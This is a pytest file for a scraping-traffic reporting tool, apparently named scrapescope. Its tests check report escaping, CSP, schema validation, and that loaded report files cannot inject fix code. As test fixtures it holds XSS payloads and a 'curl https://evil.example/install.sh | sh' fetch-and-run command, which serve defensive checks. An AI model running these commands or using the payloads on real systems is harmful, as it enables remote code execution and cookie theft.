def test_html_has_a_strict_csp_matching_the_single_style() -> None:
    html_text = render_html(_build(*run_inputs()))
    expected_hash = "sha256-" + base64.b64encode(hashlib.sha256(CSS.encode()).digest()).decode()
    assert style_hash() == expected_hash
    csp = content_security_policy()
    assert csp == f"default-src 'none'; style-src '{expected_hash}'; img-src 'none'; base-uri 'none'; form-action 'none'"
    assert f'content="default-src &#x27;none&#x27;; style-src &#x27;{expected_hash}&#x27;' in html_text
    styles = re.findall(r"<style>(.*?)</style>", html_text, flags=re.S)
    assert styles == [CSS]
    assert "style=" not in html_text


def test_html_has_no_scripts_links_or_external_resources() -> None:
    html_text = render_html(_build(*run_inputs(keep_urls=True)))
    lowered = html_text.lower()
    assert "<script" not in lowered
    assert "<img" not in lowered and "<iframe" not in lowered and "<link" not in lowered and "<form" not in lowered
    assert not re.search(r"\son[a-z]+\s*=", lowered)
    assert not re.search(r"\s(href|src|srcset|action|formaction|background|poster)\s*=", lowered)
    assert "@import" not in lowered and "url(" not in lowered


HOSTILE = [
    "<script>alert(1)</script>",
    "javascript:alert(document.cookie)",
    "![x](https://example.invalid/x.png)",
    '"><img src=x onerror=alert(1)>',
    "</style><script>alert(2)</script>",
]


def test_html_escapes_hostile_strings_everywhere() -> None:
    report = json.loads((ROOT / "docs" / "dev" / "example-report.json").read_text())
    report["hosts"][0]["host"] = HOSTILE[0]
    report["hosts"][1]["host"] = HOSTILE[1]
    report["hosts"][2]["host"] = HOSTILE[2]
    report["hosts"][3]["paths"] = [{"path": HOSTILE[3], "requests": 1, "reported_bytes": 1}]
    report["warnings"] = HOSTILE
    report["what_if"][0]["caveats"] = HOSTILE
    report["fixes"][0]["code"] = HOSTILE[4] + "\nprint('<b>')"
    report["fixes"][0]["title"] = HOSTILE[3]
    report["types"][0]["type"] = HOSTILE[0]
    report["bypass"] = {"hosts": [HOSTILE[0]], "requests": 1}
    report["incomplete"] = True
    report["find"] = json.loads((ROOT / "docs" / "dev" / "example-report-find.json").read_text())["find"]
    report["find"][0]["target_host"] = HOSTILE[1]
    report["find"][0]["matches"][0]["host"] = HOSTILE[0]
    report["find"][0]["warnings"] = [HOSTILE[2]]
    html_text = render_html(report)
    lowered = html_text.lower()
    assert "<script" not in lowered
    assert "<img" not in lowered
    assert html_text.count("</style>") == 1
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html_text
    assert "&lt;/style&gt;&lt;script&gt;alert(2)&lt;/script&gt;" in html_text
    assert "&quot;&gt;&lt;img src=x onerror=alert(1)&gt;" in html_text
    assert "![x](https://example.invalid/x.png)" in html_text  # inert text
    # sec-5: a report read from a file never supplies fix code or titles; they are rebuilt from the id.
    assert "print(" not in html_text and "&lt;b&gt;" not in html_text
    assert "Read from a report file" in html_text
    # Code this process generated is shown, and escaped.
    trusted = render_html(GeneratedReport(report))
    assert "&lt;b&gt;" in trusted and "<b>" not in trusted.split("<body>", 1)[1]
    # No raw tag from any payload survives.
    body = html_text.split("<body>", 1)[1]
    assert not re.search(r"<(script|img|a|iframe|svg|object|embed|link|meta|style)\b", body, flags=re.I)
    text_out = render_text(report)
    assert HOSTILE[0] in text_out  # the terminal shows text as text; control characters are the risk there


def test_html_shows_labels_and_not_a_bill() -> None:
    html_text = render_html(_build(*run_inputs()))
    for needle in ("tunnel-measured", "allocated", "estimated billable transfer", "not a bill"):
        assert needle in html_text
    assert '<meta name="viewport"' in html_text and "prefers-color-scheme:dark" in html_text


# ---------------------------------------------------------------------------- files


def test_write_and_load_round_trip(tmp_path: Path) -> None:
    report = _build(*run_inputs())
    json_path = tmp_path / "out" / "report.json"
    json_path.parent.mkdir()
    html_path = tmp_path / "out" / "report.html"
    write_report(report, json_path, html_path)
    assert load_report(json_path) == report
    assert html_path.read_text(encoding="utf-8").startswith("<!DOCTYPE html>")
    assert stat.S_IMODE(os.stat(json_path).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(html_path).st_mode) == 0o600
    assert sorted(p.name for p in json_path.parent.iterdir()) == ["report.html", "report.json"]
    assert json_path.read_bytes().isascii()
    # Overwrite in place.
    report2 = copy.deepcopy(report)
    report2["warnings"] = ["second"]
    write_report(report2, json_path)
    assert load_report(json_path)["warnings"] == ["second"]


def test_write_report_refuses_invalid_reports(tmp_path: Path) -> None:
    report = _build(*run_inputs())
    report["hosts"][0]["host"] = "Bad Host"
    target = tmp_path / "report.json"
    with pytest.raises(ReportError):
        write_report(report, target)
    assert list(tmp_path.iterdir()) == []


@pytest.mark.parametrize(
    "content, fragment",
    [
        (None, "cannot read"),
        (b"{not json SENTINEL-BODY", "not valid JSON"),
        (b"\xff\xfe", "not UTF-8"),
        (b"[1, 2]", "JSON object"),
        (b'{"schema_version": NaN}', "not valid report JSON"),
        (b'{"schema_version": 1, "secret": "SENTINEL-BODY"}', "not a valid scrapescope report"),
        # ux4-4: a report from a newer scrapescope says so instead of listing schema problems
        (b'{"schema_version": 2, "secret": "SENTINEL-BODY"}',
         "this report uses schema version 2; this scrapescope reads version 1, so upgrade scrapescope"),
        (b'{"schema_version": true, "secret": "SENTINEL-BODY"}', "not a valid scrapescope report"),
    ],
)
def test_load_report_errors_never_echo_content(tmp_path: Path, content: bytes | None, fragment: str) -> None:
    path = tmp_path / "report.json"
    if content is not None:
        path.write_bytes(content)
    with pytest.raises(ReportError) as info:
        load_report(path)
    assert fragment in str(info.value)
    assert "SENTINEL-BODY" not in str(info.value)


def test_gate() -> None:
    report = _build(*run_inputs())
    assert gate(report, []) == 0
    assert gate(report, ["budget", "bypass"]) == 0
    tripped = dict(report, budget=dict(report["budget"], tripped=True))
    both = dict(tripped, incomplete=True)
    assert gate(tripped, ["budget"]) == 86
    assert gate(tripped, ["bypass"]) == 0
    assert gate(dict(report, incomplete=True), ["bypass"]) == 87
    assert gate(both, ["bypass", "budget"]) == 86  # budget wins
    with pytest.raises(ValueError):
        gate(report, ["weather"])


# ---------------------------------------------------------------------------- timestamps


def test_rfc3339() -> None:
    assert rfc3339(0) == "1970-01-01T00:00:00.000Z"
    from datetime import datetime, timezone

    ts = datetime(2026, 9, 23, 10, 2, 41, 250000, tzinfo=timezone.utc).timestamp()
    assert rfc3339(ts) == "2026-09-23T10:02:41.250Z"
    assert rfc3339(ts + 0.0009) == "2026-09-23T10:02:41.250Z"  # truncated to milliseconds
    assert rfc3339(float("nan")) == "1970-01-01T00:00:00.000Z"
    assert rfc3339(-5) == "1970-01-01T00:00:00.000Z"
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z", rfc3339(1e12))


# ---------------------------------------------------------------------------- the validator


def _v(schema: dict) -> Validator:
    return Validator(schema)


def test_validator_integer_number_and_booleans() -> None:
    v = _v({"type": "integer"})
    assert v.errors(3) == [] and v.errors(3.0) == []
    assert v.errors(True) and v.errors(3.5) and v.errors("3")
    n = _v({"type": "number", "minimum": 0, "maximum": 1})
    assert n.errors(0.5) == [] and n.errors(1) == []
    assert n.errors(False) and n.errors(1.5) and n.errors(-0.1) and n.errors(float("nan"))
    assert _v({"type": ["integer", "null"], "minimum": 0}).errors(None) == []


def test_validator_const_and_enum_are_type_strict() -> None:
    assert _v({"const": 1}).errors(True)
    assert _v({"const": 1}).errors(1) == []
    assert _v({"const": 1}).errors(1.0) == []
    assert _v({"enum": [False, "x"]}).errors(0)
    assert _v({"enum": [False, "x"]}).errors(False) == []
    assert _v({"const": {"a": [1]}}).errors({"a": [1]}) == []
    assert _v({"const": {"a": [1]}}).errors({"a": [True]})


def test_validator_patterns() -> None:
    anchored = _v({"type": "string", "pattern": "^[a-z]+$"})
    assert anchored.errors("abc") == []
    assert anchored.errors("abc\n") and anchored.errors("ab c")
    alternation = _v({"type": "string", "pattern": "^a|b$"})
    assert alternation.errors("a") == [] and alternation.errors("b") == [] and alternation.errors("ab")
    unanchored = _v({"type": "string", "pattern": "b"})
    assert unanchored.errors("abc") == [] and unanchored.errors("xyz")


def test_validator_objects_arrays_strings() -> None:
    schema = {
        "type": "object",
        "additionalProperties": False,
        "required": ["a"],
        "properties": {"a": {"type": "array", "maxItems": 2, "items": {"type": "string", "minLength": 1, "maxLength": 3}}},
    }
    v = _v(schema)
    assert v.errors({"a": ["x", "yyy"]}) == []
    errs = v.errors({"a": ["", "yyyy", "z"], "b": 1})
    assert any("more than 2 items" in e for e in errs)
    assert any("shorter" in e for e in errs) and any("longer" in e for e in errs)
    assert any(e.startswith("$.b: unexpected property") for e in errs)
    assert v.errors({}) == ["$.a: required property missing"]
    names = _v({"type": "object", "propertyNames": {"pattern": "^[a-z]+$"}, "additionalProperties": {"type": "integer"}})
    assert names.errors({"ok": 1}) == []
    assert names.errors({"Bad": 1}) == ['$.Bad: property name not allowed']
    assert names.errors({"ok": "x"}) == ["$.ok: expected integer"]
    nullable = _v({"type": ["object", "null"], "required": ["x"], "additionalProperties": False})
    assert nullable.errors(None) == []


def test_validator_refs_and_unsupported_keywords() -> None:
    v = _v({"$defs": {"n": {"type": "integer"}}, "type": "object", "properties": {"x": {"$ref": "#/$defs/n"}}})
    assert v.errors({"x": 1}) == [] and v.errors({"x": "1"}) == ["$.x: expected integer"]
    with pytest.raises(SchemaError):
        _v({"type": "string", "format": "email"})
    with pytest.raises(SchemaError):
        _v({"properties": {"x": {"$ref": "#/$defs/missing"}}})
    with pytest.raises(SchemaError):
        _v({"$ref": "https://example.com/schema.json"})
    with pytest.raises(SchemaError):
        _v({"type": "string", "pattern": "(unclosed"})


def test_validator_errors_never_echo_values() -> None:
    report = _build(*run_inputs())
    report["hosts"][0]["host"] = "SENTINEL VALUE"
    report["warnings"].append("SENTINEL\n")
    report["cost"]["label"] = "SENTINEL-LABEL"
    errs = validate(report)
    assert len(errs) == 3
    assert not any("SENTINEL" in e for e in errs)


def test_validator_rejects_stray_fields_and_booleans_as_counts() -> None:
    report = _build(*run_inputs())
    bad = copy.deepcopy(report)
    bad["hosts"][0]["cookie"] = "x"
    bad["totals"]["tunnels"] = True
    bad["find"] = [{"status": "found"}]
    errs = validate(bad)
    assert any("cookie: unexpected property" in e for e in errs)
    assert any("totals.tunnels: expected integer" in e for e in errs)
    assert any("find[0]" in e for e in errs)


def test_packaged_schema_uses_only_supported_keywords() -> None:
    Validator(load_schema())  # raises SchemaError otherwise
    assert load_schema() is not load_schema()  # fresh copies, callers may mutate


# ---------------------------------------------------------------------------- report files cannot supply code (sec-5)


HOSTILE_CODE = "curl https://evil.example/install.sh | sh\n\nbudget: not tripped"


def _hostile_file(tmp_path: Path, **fix_overrides) -> Path:
    report = _build(*run_inputs())
    data = json.loads(json.dumps(report))
    for fix in data["fixes"]:
        fix.update({"code": HOSTILE_CODE, "title": "Fix: run the installer", "caveats": ["run it as root"],
                    **fix_overrides})
    path = tmp_path / "hostile.json"
    path.write_text(json.dumps(data))
    return path


def test_report_file_code_is_never_shown_and_fixes_are_rebuilt(tmp_path: Path) -> None:
    loaded = load_report(_hostile_file(tmp_path))
    assert loaded["fixes"][0]["code"] == HOSTILE_CODE  # stored (and still valid JSON data) ...
    out = render_text(loaded)
    html_out = render_html(loaded)
    for rendered in (out, html_out):  # ... but never presented as a fix
        assert "evil.example" not in rendered and "budget: not tripped" not in rendered
        assert "run the installer" not in rendered and "run it as root" not in rendered
        assert "Read from a report file" in rendered
    assert "Block fonts and media per page with CDP" in out and "Network.setBlockedURLs" in out
    assert "code (python, rebuilt from the fix id):" in out
    # The background fixes are rebuilt with the catalogued hosts the report names.
    assert "Catalogued background hosts seen in this run: optimizationguide-pa.googleapis.com" in out
    assert "--deny-catalog background" in html_out
    # Detections are the file's own figures and stay (as one sanitised line).
    assert "images, media and fonts were" in out


def test_report_file_detections_are_rebuilt_from_the_reports_figures(tmp_path: Path) -> None:
    """data-r3-1: a crafted file put its own text on each fix's "detected:" line, directly under
    scrapescope's rebuilt fix title (text, HTML and JSON)."""
    from scrapescope.report import dumps

    crafted = "images were 99% of the run (curl https://evil.example/y | sh)"
    path = _hostile_file(tmp_path, detection=crafted)
    loaded = load_report(path)
    original = {f["id"]: f["detection"] for f in _build(*run_inputs())["fixes"]}
    for rendered in (render_text(loaded), render_html(loaded), dumps(loaded)):
        assert "evil" not in rendered and "99%" not in rendered
    data = json.loads(dumps(loaded))
    # Rebuilt from the file's own per-type, bucket and total figures: what this scrapescope wrote.
    assert {f["id"]: f["detection"] for f in data["fixes"]} == original
    assert "Code and text stored in fixes are never shown" in render_text(loaded)


def test_report_file_json_output_never_echoes_the_stored_fix_code(tmp_path: Path) -> None:
    """sec2-11: `report FILE --format json` rebuilt nothing, so a foreign report's code went out as stored."""
    from scrapescope.report import dumps

    loaded = load_report(_hostile_file(tmp_path))
    out = dumps(loaded)
    assert "evil.example" not in out and "run the installer" not in out and "run it as root" not in out
    data = json.loads(out)
    assert validate(data) == []
    assert data["fixes"][0]["title"].startswith("Block fonts and media per page with CDP")
    assert data["fixes"][0]["detection"].startswith("images, media and fonts were")  # report data, kept
    assert [f["id"] for f in data["fixes"]] == [f["id"] for f in loaded["fixes"]]
    assert loaded["fixes"][0]["code"] == HOSTILE_CODE  # the loaded dict itself is not changed
    # A report built in this process is written exactly as built.
    built = _build(*run_inputs())
    assert json.loads(dumps(built)) == json.loads(json.dumps(built))


def test_report_file_with_an_unknown_fix_id_is_rejected(tmp_path: Path) -> None:
    path = _hostile_file(tmp_path, id="x")
    with pytest.raises(ReportError):
        load_report(path)
    assert any("fixes" in problem for problem in validate(json.loads(path.read_text())))


def test_unknown_fix_ids_in_hand_made_reports_are_omitted() -> None:
    data = json.loads(json.dumps(_build(*run_inputs())))
    data["fixes"][0]["id"] = "x"
    out = render_text(data)
    assert "[x] not a fix this scrapescope generates; omitted" in out
    assert "evil" not in out


def test_fresh_reports_show_their_generated_code() -> None:
    report = _build(*run_inputs())
    assert "Read from a report file" not in render_text(report)
    assert report["fixes"][0]["code"].splitlines()[0] in render_text(report)


def test_redacted_report_files_rebuild_background_hosts_from_the_catalog(tmp_path: Path) -> None:
    snapshot, attribution, options = run_inputs(redact_hosts=True)
    data = json.loads(json.dumps(_build(snapshot, attribution, options)))
    assert any(h["host"] == "catalog:optimization-guide" for h in data["hosts"])
    out = render_text(data)
    assert "Catalogued background hosts seen in this run: optimizationguide-pa.googleapis.com" in out


# ---------------------------------------------------------------------------- labels (meas-2/3, data-1/6, find-10, meas-12)


def test_types_heading_allows_scaling_down_and_explains_unreported() -> None:
    snapshot, attribution, options = run_inputs()
    attribution.types.append(TypeAllocation(type="unreported", requests=0, reported_bytes=0, allocated_bytes=0))
    out = render_text(_build(snapshot, attribution, options))
    assert "plus a share of tunnel overhead" not in out
    assert "shared in proportion to reported sizes, scaled down or up" in out
    assert "unreported: tunnel bytes beyond the reported sizes" in out
    html_out = render_html(_build(snapshot, attribution, options))
    assert "scaled down or up" in html_out and "unreported: tunnel bytes beyond" in html_out


def test_incomplete_banner_names_hosts_found_by_volume() -> None:
    snapshot, attribution, options = run_inputs()
    attribution.bypass = BypassInfo(incomplete=True, hosts=["origin-a.test"], requests=0)
    report = _build(snapshot, attribution, options)
    out = render_text(report)
    assert "!! INCOMPLETE: helpers or hooks reported traffic that the meter did not carry (hosts: origin-a.test)" in out
    assert "found no meter tunnel" not in out
    assert "INCOMPLETE: helpers or hooks reported traffic" in render_html(report)
    assert gate(report, ["bypass"]) == EXIT_BYPASS


def test_launches_not_recorded_when_a_browser_ran() -> None:
    snapshot, attribution, options = run_inputs()
    attribution.browser_launches = 0
    out = render_text(_build(snapshot, attribution, options))
    assert "browser launches: not recorded" in out
    attribution.types = [TypeAllocation(type="http_client", requests=3, reported_bytes=1, allocated_bytes=1)]
    assert "browser launches: 0" in render_text(_build(snapshot, attribution, options))


def test_cache_served_events_are_counted_in_the_units_section() -> None:
    snapshot, attribution, options = run_inputs()
    attribution.events = EventCounts(attach=1, launch=1, request=149, dropped=0)  # histogram holds 131
    out = render_text(_build(snapshot, attribution, options))
    assert "not network requests: 18 request event(s): HTTP-cache hits, service-worker answers" in out
    # meas2-1 / docs-3: requests answered or stopped before the network are named too, and the
    # status line says what "failed" means.
    assert "route.fulfill, route.abort, browser blocks such as mixed content" in out
    assert "status (network requests; failed = no response): 200 x128" in out
    html_out = render_html(_build(snapshot, attribution, options))
    assert "not network requests" in html_out and "failed = no response" in html_out


def test_per_unit_withheld_is_explained() -> None:
    from scrapescope.attribution.core import PER_UNIT_WITHHELD_PREFIX

    snapshot, attribution, options = run_inputs()
    attribution.per_unit = None
    attribution.warnings.append(f"{PER_UNIT_WITHHELD_PREFIX}: the first two units started 0.031 s apart")
    out = render_text(_build(snapshot, attribution, options))
    assert "first unit vs the rest: not shown" in out


def test_find_reports_label_the_page_load_and_the_top_match_share() -> None:
    snapshot, attribution, options, finds = find_inputs()
    report = _build(snapshot, attribution, options, finds)
    assert report["browser_launches"] == 1 and report["units"]["low_sample_warning"] is False
    out = render_text(report)
    assert "browser launches: 1" in out and "Page load (find)" in out
    assert "units: 0 (none)" not in out
    # The fixture's --verify replay ran, so its tunnel is part of the unattributed bytes.
    assert "find page load and --verify replay (see the find section)" in out
    hosts_section = out.split("Hosts (", 1)[1].split("Buckets", 1)[0]
    assert "  origin-a.test" in out and "find page load and --verify replay" in hosts_section
    # find3-1: the report prints find's own share line (TLS left out of both sides, like with like).
    from scrapescope.find.render import share_line

    top = report["find"][0]["matches"][0]
    share = (top["billed_basis_bytes"] - top["tls_handshake_estimate"]) / report["find"][0]["page_reported_bytes"]
    line = share_line(finds[0])
    assert line is not None and line.startswith(f"share: {share * 100:.1f}% of this page load (")
    assert f"  {line}\n" in out and "DevTools-reported, TLS left out of both" in out
    html_out = render_html(report)
    assert "Page load (find)" in html_out and '<th scope="row">share</th>' in html_out and f"{share * 100:.1f}%" in html_out


def test_find_reports_do_not_read_like_run_reports() -> None:
    """ux4-1: find writes no helper events, so its hosts show "requests 0" although find saw their
    responses; report.json put the page load in buckets.unattributed with nothing saying so; and the
    footer named per-type allocation and costs that a find report does not have."""
    snapshot, attribution, options, finds = find_inputs()
    report = _build(snapshot, attribution, options, finds)
    assert validate(report) == []
    # JSON consumers are told what the unattributed bucket holds in a find report.
    assert report["labels"]["unattributed"] == "find page load and --verify replay"
    assert {k: v for k, v in report["labels"].items() if k != "unattributed"} == LABELS
    finds[0].verify = VerifyResult(replays="not_tested", reason="not requested")
    assert _build(snapshot, attribution, options, finds)["labels"]["unattributed"] == "find page load"
    schema = load_schema()
    assert "find" in schema["properties"]["buckets"]["properties"]["unattributed"]["description"]
    assert "find" in schema["$defs"]["hostRow"]["properties"]["requests"]["description"]
    # The hosts table shows no helper-request count for find hosts.
    out = render_text(report)
    rows = [line for line in out.split("Hosts (", 1)[1].split("Buckets", 1)[0].splitlines()
            if line.startswith("  origin-")]
    assert rows and all(re.search(r"\s-\s+find page load", row) for row in rows), rows
    html_out = render_html(report)
    assert re.search(r'<td class="n">-</td><td class="w">find page load', html_out)
    # The footer names only what the report holds.
    footer = out.rstrip("\n").splitlines()[-1]
    assert footer.startswith("Totals are tunnel-measured") and footer.endswith("This is a measurement, not a bill.")
    assert "per-type" not in footer and "costs" not in footer and "find" in footer
    assert "per-type figures are allocated" not in html_out.split("<footer>", 1)[1]
    # With --rate the cost clause returns; a run report keeps the full footer and its labels.
    priced = render_text(_build(*find_inputs(rate=3.0)))
    assert "costs are estimated billable transfer at your rate" in priced.rstrip("\n").splitlines()[-1]
    from scrapescope.report.text import NOT_A_BILL

    run = _build(*run_inputs())
    assert run["labels"] == LABELS
    assert render_text(run).rstrip("\n").splitlines()[-1] == NOT_A_BILL


def test_find_share_ignores_the_verify_replay_and_background_tunnels() -> None:
    """find-r2-2 / honest-1: the share's denominator is the page load, not the run's tunnel total.

    The tunnel total holds the --verify replay (and any Chromium background download made during
    the load); the report used to divide by it and call it "the page load (tunnel-measured)", so the
    terminal (DevTools-reported page load) and the report printed two shares for one match.
    """
    snapshot, attribution, options, finds = find_inputs()
    finds[0].matches[0].billed_basis_bytes = 7_200 + 100_000  # a share large enough to tell the bases apart
    report = _build(snapshot, attribution, options, finds)
    page = report["find"][0]["page_reported_bytes"]
    billed = report["find"][0]["matches"][0]["billed_basis_bytes"]
    assert report["totals"]["with_connect"] != page
    own = billed - report["find"][0]["matches"][0]["tls_handshake_estimate"]
    expected = f"{own / page * 100:.1f}%"
    wrong = f"{own / report['totals']['with_connect'] * 100:.1f}%"
    assert expected != wrong
    for out in (render_text(report), render_html(report)):
        assert expected in out and f"{wrong} of" not in out
        assert "tunnel-measured)" not in out.split("share", 1)[1][:400]
    # Without a replay the bucket is the page load alone.
    finds[0].verify = VerifyResult(replays="not_tested", reason="not requested")
    out = render_text(_build(snapshot, attribution, options, finds))
    assert "find page load (see the find section)" in out and "--verify replay (see" not in out


def test_find_hosts_table_names_the_verify_replay_only_for_its_host() -> None:
    """find-r2-2: the replay's tunnel is on the verified match's host; other hosts hold the page load only."""
    snapshot, attribution, options, finds = find_inputs()
    out = render_text(_build(snapshot, attribution, options, finds))
    hosts_section = out.split("Hosts (", 1)[1].split("Buckets", 1)[0]
    rows = {line.split()[0]: line for line in hosts_section.splitlines() if line.startswith("  origin-")}
    assert rows["origin-a.test"].endswith("find page load and --verify replay")
    assert rows["origin-c.test"].endswith("find page load")
    html_out = render_html(_build(snapshot, attribution, options, finds))
    assert '<td class="w">find page load and --verify replay</td>' in html_out
    assert '<td class="w">find page load</td>' in html_out
    # Redacted reports compare the redacted names, which are stable within one report.
    report = _build(*find_inputs(redact_hosts=True))
    labels = [line for line in render_text(report).split("Hosts (", 1)[1].split("Buckets", 1)[0].splitlines()
              if line.startswith("  redacted:")]
    assert sorted(line.endswith("--verify replay") for line in labels) == [False, True]


def test_find_share_uses_the_top_complete_network_match_like_the_terminal() -> None:
    """find-r2-2: the terminal picks the smallest response holding every value, network copies first."""
    from scrapescope.find import render_find_text

    snapshot, attribution, options, finds = find_inputs()
    result = finds[0]
    cached = copy.deepcopy(result.matches[0])
    cached.rank, cached.billed_basis_bytes, cached.locations = 1, 0, ["fetch", "served-from-cache"]
    partial = copy.deepcopy(result.matches[0])
    partial.rank, partial.all_values, partial.billed_basis_bytes = 2, False, 50
    first, second = result.matches
    first.rank, second.rank = 3, 4
    result.values_count = 2
    result.matches = [cached, partial, first, second]
    report = _build(snapshot, attribution, options, finds)
    own = first.billed_basis_bytes - first.tls_handshake_estimate
    share = f"{own / result.page_reported_bytes * 100:.1f}%"
    # find3-1: the report prints the terminal's own share line, so the two can never disagree.
    terminal = next(line for line in render_find_text(result, show_code=False).splitlines() if line.startswith("share"))
    assert terminal.startswith(f"share: {share} of this page load")
    assert f"  {terminal}\n" in render_text(report)
    # An ineligible top match gets the "not shown" line in both places.
    first.code_eligible, first.code_ineligible_reason = False, "sent authorization"
    first.flags.sent_authorization = True
    report = _build(snapshot, attribution, options, finds)
    terminal = next(line for line in render_find_text(result, show_code=False).splitlines() if line.startswith("share"))
    assert terminal.startswith("share of this page load: not shown for rank 3 (")
    assert f"  {terminal}\n" in render_text(report) and "% of this page load" not in render_text(report)
    # No response with every value: no share line (the terminal says so instead).
    for m in result.matches:
        m.all_values = False
    out = render_text(_build(snapshot, attribution, options, finds))
    assert "share:" not in out and "share of this page load" not in out


@pytest.mark.parametrize(
    "char",
    ["\u200e", "\u200f", "\u061c", "\u2028", "\u2029", "\u200b", "\u00ad", "\u2066", "\ufeff", "\U000e0041",
     "\x1b", "\t"],
)
def test_schema_text_rejects_every_character_safe_text_escapes(char: str) -> None:
    """sec-15: a hostile report file cannot carry bidi marks, separators or zero-width characters in text."""
    report = json.loads((ROOT / "docs" / "dev" / "example-report.json").read_text())
    report["warnings"] = ["host" + char + "name"]
    assert validate(report), repr(char)
    from scrapescope.types import safe_text

    assert char not in safe_text("host" + char + "name")
    report["warnings"] = [safe_text("host" + char + "name")]
    assert validate(report) == []


def test_schema_nullable_text_uses_the_text_pattern() -> None:
    """sec2-2: nullableText (verify.reason, code_ineligible_reason) must not lag behind text."""
    defs = load_schema()["$defs"]
    assert defs["nullableText"]["pattern"] == defs["text"]["pattern"]


@pytest.mark.parametrize(
    "char",
    ["\u200e", "\u200f", "\u061c", "\u2028", "\u2029", "\u200b", "\u00ad", "\u2066", "\ufeff", "\U000e0041",
     "\x1b", "\t"],
)
@pytest.mark.parametrize("field", ["verify.reason", "code_ineligible_reason"])
def test_schema_nullable_text_rejects_every_character_safe_text_escapes(char: str, field: str) -> None:
    """sec2-2: find[].verify.reason and matches[].code_ineligible_reason reject the same characters as text."""
    report = json.loads((ROOT / "docs" / "dev" / "example-report-find.json").read_text())
    find = report["find"][0]
    target = find["verify"] if field == "verify.reason" else find["matches"][0]
    key = field.rsplit(".", 1)[-1]
    target[key] = "status 200" + char + "FAKE"
    assert validate(report), repr(char)
    target[key] = None
    assert validate(report) == []


def test_text_renderer_sanitises_the_verify_reason_of_an_unvalidated_report() -> None:
    """sec2-2: a reason with a line separator or bidi marks never reaches the terminal raw."""
    report = json.loads((ROOT / "docs" / "dev" / "example-report-find.json").read_text())
    # a "no" prints its reason (a "yes" line, as in the terminal, shows the replay's figures instead)
    report["find"][0]["verify"]["replays"] = "no"
    report["find"][0]["verify"]["reason"] = "status 200\u2028FAKE\u200f\u061c\u200b"
    out = render_text(report)
    for char in ("\u2028", "\u200f", "\u061c", "\u200b"):
        assert char not in out
    assert "FAKE" in out


@pytest.mark.parametrize("name", ["example-report.json", "example-report-find.json"])
def test_renderers_escape_separators_and_bidi_marks_in_every_string_of_an_unvalidated_report(name: str) -> None:
    """sec2-2: no string of a report dict reaches the terminal or the HTML page with these characters raw."""
    hostile = "\u2028FAKE\u2029\u200e\u200f\u061c\u200b\u00ad\u2066\ufeff"

    def poison(value):
        if isinstance(value, dict):
            return {k: poison(v) for k, v in value.items()}
        if isinstance(value, list):
            return [poison(v) for v in value]
        return value + hostile if isinstance(value, str) else value

    report = poison(json.loads((ROOT / "docs" / "dev" / name).read_text()))
    report["command"] = "find" if "find" in name else "run"  # keep the renderer on the path under test
    for out in (render_text(report), render_html(report)):
        assert "FAKE" in out
        for char in hostile.replace("FAKE", ""):
            assert char not in out, (name, hex(ord(char)))


def test_schema_code_allows_newlines_and_tabs_like_safe_code() -> None:
    report = json.loads((ROOT / "docs" / "dev" / "example-report.json").read_text())
    assert report["fixes"], "the golden example carries fixes"
    report["fixes"][0]["code"] = "a\n\tb"
    assert validate(report) == []
    report["fixes"][0]["code"] = "a\u2028b"
    assert validate(report)


def test_golden_examples_are_generator_output() -> None:
    """docs-5: the golden reports (also the viewer's samples) are what the real builders write today.

    Fix titles, detections, code and caveats, what-if and warning texts all come from
    the generators; a change to any of them makes this fail until
    ``python scripts/make_example_reports.py --write`` regenerates the files.
    """
    import importlib.util

    spec = importlib.util.spec_from_file_location("make_example_reports", ROOT / "scripts" / "make_example_reports.py")
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    run_report, find_report = module.build_examples()
    assert json.loads((ROOT / "docs" / "dev" / "example-report.json").read_text()) == run_report
    assert json.loads((ROOT / "docs" / "dev" / "example-report-find.json").read_text()) == find_report
    assert {f["id"] for f in run_report["fixes"]} == {
        "playwright-cdp-block", "playwright-route-block", "chromium-background-flags", "playwright-mcp-flags"}
    assert find_report["find"][0]["matches"][0]["locations_by_value"]


def test_totals_show_connections_only_when_fewer_than_tunnel_records() -> None:
    """meas4-6 (b): totals.connections counts upstream connections; text and HTML show it when it differs.

    A keep-alive plain-HTTP client that switches host on the HTTP CONNECT route keeps its provider
    connection, so one connection carries several tunnel records. Older reports have no field.
    """
    report = json.loads((ROOT / "docs" / "dev" / "example-report.json").read_text())
    assert report["totals"]["connections"] == report["totals"]["tunnels"]
    assert validate(report) == []
    assert "  connections  " not in render_text(report) and "fewer than tunnels" not in render_html(report)
    fewer = copy.deepcopy(report)
    fewer["totals"]["connections"] = report["totals"]["tunnels"] - 1
    assert validate(fewer) == []
    text = render_text(fewer)
    assert f"  connections       {report['totals']['tunnels'] - 1} (fewer than tunnels" in text
    assert "a kept provider connection carried records for several hosts" in render_html(fewer)
    older = copy.deepcopy(report)
    del older["totals"]["connections"]
    assert validate(older) == [] and "  connections  " not in render_text(older)
